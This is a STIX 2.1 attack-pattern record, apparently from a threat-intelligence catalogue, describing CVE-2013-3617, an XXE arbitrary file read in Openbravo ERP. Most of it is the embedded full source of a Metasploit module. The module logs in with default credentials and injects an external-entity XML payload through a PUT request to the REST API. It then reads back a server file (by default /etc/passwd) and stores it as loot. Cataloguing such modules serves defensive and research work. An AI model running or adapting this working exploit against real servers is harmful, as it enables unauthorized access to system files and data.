{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eebc45c5-441a-4d5b-815f-15dbe491b4f1",
    "created": "2024-08-14T16:23:05.648047Z",
    "modified": "2024-08-14T16:23:05.648051Z",
    "name": "Openbravo ERP XXE Arbitrary File Read",
    "description": " The Openbravo ERP XML API expands external entities which can be defined as local files. This allows the user to read any files from the FS as the user Openbravo is running as (generally not root).  This module was tested against Openbravo ERP version 3.0MP25 and 2.50MP6. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/openbravo_xxe.rb",
            "external_id": "openbravo_xxe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3617"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/dns'\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Openbravo ERP XXE Arbitrary File Read',\n        'Description' => %q{\n          The Openbravo ERP XML API expands external entities which can be defined as\n          local files. This allows the user to read any files from the FS as the\n          user Openbravo is running as (generally not root).\n\n          This module was tested against Openbravo ERP version 3.0MP25 and 2.50MP6.\n        },\n        'Author' => [\n          'Brandon Perry <bperry.volatile[at]gmail.com>' # Discovery / msf module\n        ],\n        'References' => [\n          ['CVE', '2013-3617'],\n          ['OSVDB', '99141'],\n          ['BID', '63431'],\n          ['URL', 'https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats']\n        ],\n        'License' => MSF_LICENSE,\n        'DisclosureDate' => '2013-10-30'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'Base Openbravo directory path', '/openbravo/']),\n        OptString.new('HttpUsername', [true, 'The Openbravo user', 'Openbravo']),\n        OptString.new('HttpPassword', [true, 'The Openbravo password', 'openbravo']),\n        OptString.new('FILEPATH', [true, 'The filepath to read on the server', '/etc/passwd']),\n        OptString.new('ENDPOINT', [true, 'The XML API REST endpoint to use', 'ADUser'])\n      ]\n    )\n  end\n\n  def run\n    print_status('Requesting list of entities from endpoint, this may take a minute...')\n    users = send_request_raw({\n      'method' => 'GET',\n      'uri' => normalize_uri(datastore['TARGETURI'], \"/ws/dal/#{datastore['ENDPOINT']}\"),\n      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])\n    }, 60)\n\n    if !users || (users.code != 200)\n      fail_with(Failure::NoAccess, 'Invalid response. Check your credentials and that the server is correct.')\n    end\n\n    xml = path = id = other_id = ''  # for later use\n    doc = REXML::Document.new users.body\n\n    doc.root.elements.each do |user|\n      id = user.attributes['id']\n      other_id = user.attributes['identifier']\n      print_status(\"Found #{datastore['ENDPOINT']}  #{other_id}  with ID: #{id}\")\n\n      print_status(\"Trying #{other_id}\")\n      xml = %(<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ELEMENT comments ANY >\n  <!ENTITY xxe SYSTEM \"file://)\n\n      xml << \"#{datastore['FILEPATH']}\\\" > ]>\\n\"\n      xml << '<ob:Openbravo xmlns:ob=\"http://www.openbravo.com\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">'\n      xml << \"<#{datastore['ENDPOINT']} id=\\\"#{id}\\\" identifier=\\\"#{other_id}\\\">\"\n      xml << \"<id>#{id}</id>\"\n      xml << '<comments>&xxe;</comments>'\n      xml << \"</#{datastore['ENDPOINT']}>\"\n      xml << '</ob:Openbravo>'\n\n      resp = send_request_raw({\n        'method' => 'PUT',\n        'uri' => normalize_uri(target_uri.path, \"/ws/dal/#{datastore['ENDPOINT']}/#{id}\"),\n        'data' => xml,\n        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])\n      })\n\n      if !resp || (resp.code != 200) || resp.body =~ (/Not updating entity/)\n        print_error(\"Problem updating #{datastore['ENDPOINT']} #{other_id} with ID: #{id}\")\n        next\n      end\n\n      print_status(\"Found writable #{datastore['ENDPOINT']}: #{other_id}\")\n\n      u = send_request_raw({\n        'method' => 'GET',\n        'uri' => normalize_uri(datastore['TARGETURI'], \"/ws/dal/#{datastore['ENDPOINT']}/#{id}\"),\n        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])\n      })\n\n      u = REXML::Document.new u.body\n      path = store_loot('openbravo.file', 'text/plain/', datastore['RHOST'], u.root.elements['//comments'].first.to_s, \"File from Openbravo server #{datastore['RHOST']}\")\n      break\n    end\n\n    if path != ''\n      print_status('Cleaning up after ourselves...')\n\n      xml.sub!('&xxe;', '')\n\n      send_request_raw({\n        'method' => 'PUT',\n        'uri' => normalize_uri(target_uri.path, \"/ws/dal/#{datastore['ENDPOINT']}/#{id}\"),\n        'data' => xml,\n        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])\n      })\n\n      print_good(\"File saved to: #{path}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-30"
}